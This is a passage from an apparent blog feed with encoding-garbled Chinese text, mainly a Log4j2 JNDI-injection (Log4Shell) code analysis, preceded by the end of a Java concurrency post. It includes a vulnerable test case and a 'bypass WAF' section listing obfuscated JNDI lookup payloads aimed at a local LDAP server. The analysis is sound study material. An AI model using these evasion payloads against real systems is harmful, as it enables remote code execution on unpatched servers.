class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">[1, 2, 3, 4]</span><br></pre></td></tr></table></figure><br>å¦‚æœæŠŠCopyOnWriteArrayListæ”¹æˆArrayListï¼Œé‚£ä¹ˆå°±ä¼šå› ä¸ºnextçš„ç¬¬ä¸€è¡Œçš„å‡½æ•°checkForComodification()æŠ¥é”™<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>CopyOnWriteArrayListèƒ½è§£å†³å¤šçº¿ç¨‹çš„é—®é¢˜ä¸»è¦æœ‰ä¸‰ç‚¹</p><ul><li>ä½¿ç”¨äº†èµ‹å€¼ä»¥åçš„elementså»è¿›è¡Œè¿­ä»£ï¼Œå¹¶ä¸ä¼šå»ç›´æ¥æ“ä½œåŸå…ˆçš„elements</li><li>åœ¨è¿›è¡Œäº†addæ“ä½œçš„æ—¶å€™è¿›è¡Œäº†åŠ é”æ“ä½œ</li><li>åŠ é”å®Œä»¥åï¼Œä¼šå¯¹elementså¤åˆ¶ä¸€ä¸ªæ–°çš„å¤‡ä»½ï¼Œç„¶ååœ¨æ–°çš„å¤‡ä»½åŠ å®Œä»¥åå†è¦†ç›–æ—§çš„</li></ul><p>ä»¥ä¸Šä¸‰ç‚¹æœ€é‡è¦çš„è¿˜æ˜¯ç¬¬ä¸€ç‚¹ï¼Œå¯ä»¥è‡ªå·±å¯¹æ™®é€šçš„ArrayListçš„addæ“ä½œè¿›è¡ŒåŠ é”å®éªŒä¸€ä¸‹ï¼Œä¾æ—§ä¼šæŠ¥é”™</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://juejin.cn/post/6844903576339218440">https://juejin.cn/post/6844903576339218440</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™ä¸¤ä¸ªæœˆä¸çŸ¥é“å¹²å˜›ï¼Œå­¦å·¥å…·åˆä¸æƒ³å­¦ï¼Œå°±å¼€å§‹ç ”ç©¶tomcatçš„æºç ã€‚&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="tomcat" scheme="http://example.com/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>log4j2 åˆ†æ</title>
    <link href="http://example.com/2023/03/08/log4j2-%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/03/08/log4j2-%E5%88%86%E6%9E%90/</id>
    <published>2023-03-08T03:50:49.000Z</published>
    <updated>2023-04-19T12:38:42.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®æˆ‘æ€»æ„Ÿè§‰è¿™åº”è¯¥ä¸å±äºæ¼æ´ï¼Œåº”è¯¥æ˜¯ä»–ä»¬çš„æ­£å¸¸åŠŸèƒ½ï¼Œåªä¸è¿‡æ°å¥½å¯ä»¥è¢«å½“æˆæ¼æ´æ¥ç”¨<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup</a><br>å®˜ç½‘ä¹Ÿæœ‰ç›¸å…³çš„ä»‹ç»ï¼Œè™½ç„¶è¿™äº›æ˜¯å†™åˆ°é…ç½®æ–‡ä»¶é‡Œé¢çš„<br><span id="more"></span></p><h2 id="å‰æœŸé…ç½®"><a href="#å‰æœŸé…ç½®" class="headerlink" title="å‰æœŸé…ç½®"></a>å‰æœŸé…ç½®</h2><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="trustURLCodebase"><a href="#trustURLCodebase" class="headerlink" title="trustURLCodebase"></a>trustURLCodebase</h3><p>å› ä¸ºæ¼æ´æ ¸å¿ƒæ˜¯lookupå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆå°±å±äºjndiæ³¨å…¥ï¼Œéœ€è¦ä½ç‰ˆæœ¬jdkï¼Œæˆ–è€…å¼€å¯trustURLCodebase<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>)); </span><br></pre></td></tr></table></figure><br>å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æœ¬åœ°gadgetï¼Œè¿™å±äºjndiæ³¨å…¥çš„çŸ¥è¯†ï¼Œè¿™é‡Œä¸åšè¿‡å¤šè®¨è®º</p><h3 id="æ¼æ´ä»£ç "><a href="#æ¼æ´ä»£ç " class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(test.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.fatal(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1/exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">lookup:172, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:161, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">fatal:1053, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:10, test</span><br></pre></td></tr></table></figure><h3 id="MessagePatternConverter"><a href="#MessagePatternConverter" class="headerlink" title="MessagePatternConverter"></a>MessagePatternConverter</h3><p>ä»<br><code>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</code><br>å¼€å§‹çœ‹èµ·<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>åˆ†æç¬¬äºŒè¡Œå¯ä»¥çŸ¥é“ï¼Œå¦‚æœé‡åˆ°<code>$&#123;</code>ï¼Œå°±ä¼šè¿›å…¥åˆ¤æ–­è¯­å¥ï¼Œè€Œè¿™ä¸ªworkingBuilderå’Œlogger.fatal()çš„å‚æ•°ç›¸å…³ï¼Œæ¢å¥è¯è¯´ï¼ŒåŸºæœ¬ä¸ŠworkingBuilderå°±æ˜¯logger.fatal()ä¸­çš„å‚æ•°ï¼Œåªä¸è¿‡ç±»å‹è¢«è½¬æ¢äº†ä¸€ä¸‹ï¼ŒåŸæœ¬æ˜¯Stringï¼Œç°åœ¨æ˜¯StringBuilderç±»ã€‚<br>ç»§ç»­å¾€ä¸‹èµ°ï¼Œè¿›å…¥replace<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ¥åˆ°äº†æ¼æ´æ ¸å¿ƒç‚¹substitue()</p><h3 id="substitue"><a href="#substitue" class="headerlink" title="substitue"></a>substitue</h3><p>æ¥ä¸‹æ¥ä¼šé€æ®µåˆ†æè¯¥å‡½æ•°ä¸­é‡è¦çš„ä»£ç æ®µ<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>åœ¨è¿™é‡Œä¼šå…ˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨ä»£ç ä¸­è¿˜å­˜åœ¨<code>$&#123;</code>ï¼Œå°±ä¼šè¿›å…¥é€’å½’ï¼Œåœ¨é‡Œé¢è¿›è¡Œå†ä¸€æ¬¡è§£æï¼Œè¿™æ®µå…ˆæ”¾æ”¾ï¼Œç»§ç»­å¾€ä¸‹çœ‹</p><p><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/2.jpg" alt><br>åœ¨è¿™é‡ŒvalueDelimiterMatcheræ˜¯<code>[:,-]</code><br>ä¹Ÿå°±æ˜¯è¯´å¦‚æœåŒ¹é…åˆ°äº†:-å°±ä¼šè¿›å…¥å¾ªç¯è¯­å¥ï¼Œå¹¶è¿›è¡Œä¸€æ¬¡åˆ‡å‰²å¤„ç†<br>æ¯”å¦‚aaa:-bbbï¼Œ<br>å‰é¢çš„aaaä¼šè¢«èµ‹å€¼ç»™varName<br>åé¢çš„å€¼bbbä¼šè¢«èµ‹å€¼ç»™varDefaultValue<br>æ¥ç€å¾€ä¸‹èµ°<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/3.jpg" alt><br>å…ˆä¸è¯¦ç»†ä»‹ç»resolveVariableï¼Œåªéœ€è¦çŸ¥é“å¦‚æœæ˜¯ç±»ä¼¼å‰é¢<code>aaa:-bbb</code>è¿™æ ·çš„å€¼æ²¡ä»€ä¹ˆç‰¹æ®Šæ„ä¹‰çš„å€¼ï¼Œä¼šç›´æ¥è¿”å›nullï¼Œé‚£ä¹ˆå°±ä¼šæŠŠvarDefaultValueèµ‹å€¼ç»™varValueï¼Œä¹Ÿå°±æ˜¯bbbï¼Œè€Œä¸‹é¢çš„ä»£ç å¤§æ„å°±æ˜¯æŠŠbufç”¨varValueè¿›è¡Œäº†éƒ¨åˆ†æ›¿æ¢<br>å¦‚æœpayloadåŸæœ¬æ˜¯<br><code>$&#123;jndi:ldap://127.0.0.1/$&#123;abc:-exp&#125;loit&#125;</code><br>é‚£ä¹ˆå°±ä¼šè¢«æ›¿æ¢æˆ<br><code>$&#123;jndi:ldap://127.0.0.1/exploit&#125;</code></p><p>é‚£ä¹ˆå›åˆ°åˆšåˆšå¼€å§‹é‚£ä¸ªé€’å½’çš„åœ°æ–¹<br><img src="/2023/03/08/log4j2-%E5%88%86%E6%9E%90/1.jpg" alt><br>varNameExprå°±ä¼šè¢«èµ‹å€¼ä¸ºè¢«æ›¿æ¢è¿‡çš„payloadæ¥ç€è§£æ</p><h3 id="resolveVariable"><a href="#resolveVariable" class="headerlink" title="resolveVariable"></a>resolveVariable</h3><p>æ¥ä¸‹æ¥é‡ç‚¹è®²ä¸‹resolveVariableï¼Œè¿™é‡Œæ˜¯è§¦å‘jndiæ³¨å…¥çš„å…³é”®<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œçš„resolverå¯ä»¥çœ‹ç›¸å…³æ–‡æ¡£<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a><br>è¿›å…¥è¿™ä¸ªlookupä¸­<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">return</span> <span class="variable">event</span> <span class="operator">=</span>= <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å› ä¸ºä¼šå»åˆ†å‰²<code>:</code>ï¼Œé‚£ä¹ˆä¼šæ ¹æ®jndiå–å‡ºjndiçš„strLookupMapï¼Œæœ€åè¿›è¡Œjndiè°ƒç”¨</p><h2 id="ç»•waf"><a href="#ç»•waf" class="headerlink" title="ç»•waf"></a>ç»•waf</h2><p>ä»–ä¼šæ ¹æ®ä¼ å…¥çš„åè®®å–å‡ºç›¸å¯¹åº”çš„lookupï¼Œç„¶åè°ƒç”¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥æœ‰å¦‚ä¸‹çš„ç»•è¿‡æ‰‹æ³•<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=&#125;</span><br></pre></td></tr></table></figure></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html">http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.html</a></li><li><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å…¶å®æˆ‘æ€»æ„Ÿè§‰è¿™åº”è¯¥ä¸å±äºæ¼æ´ï¼Œåº”è¯¥æ˜¯ä»–ä»¬çš„æ­£å¸¸åŠŸèƒ½ï¼Œåªä¸è¿‡æ°å¥½å¯ä»¥è¢«å½“æˆæ¼æ´æ¥ç”¨&lt;br&gt;&lt;a href=&quot;https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup&quot;&gt;https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup&lt;/a&gt;&lt;br&gt;å®˜ç½‘ä¹Ÿæœ‰ç›¸å…³çš„ä»‹ç»ï¼Œè™½ç„¶è¿™äº›æ˜¯å†™åˆ°é…ç½®æ–‡ä»¶é‡Œé¢çš„&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="log4j" scheme="http://example.com/tags/log4j/"/>
    
    <category term="jndi" scheme="http://example.com/tags/jndi/"/>
    
  </entry>
  
  <entry>
    <title>åŸºäºmvcæ¡†æ¶çš„cmsåˆ†æ(æ²¡æ—¶é—´å†™)</title>
    <link href="http://example.com/2023/02/28/%E5%9F%BA%E4%BA%8Emvc%E6%A1%86%E6%9E%B6%E7%9A%84cms%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/02/28/%E5%9F%BA%E4%BA%8Emvc%E6%A1%86%E6%9E%B6%E7%9A%84cms%E5%88%86%E6%9E%90/</id>
    <published>2023-02-28T12:05:46.000Z</published>
    <updated>2023-04-19T12:39:52.199Z</updated>
    
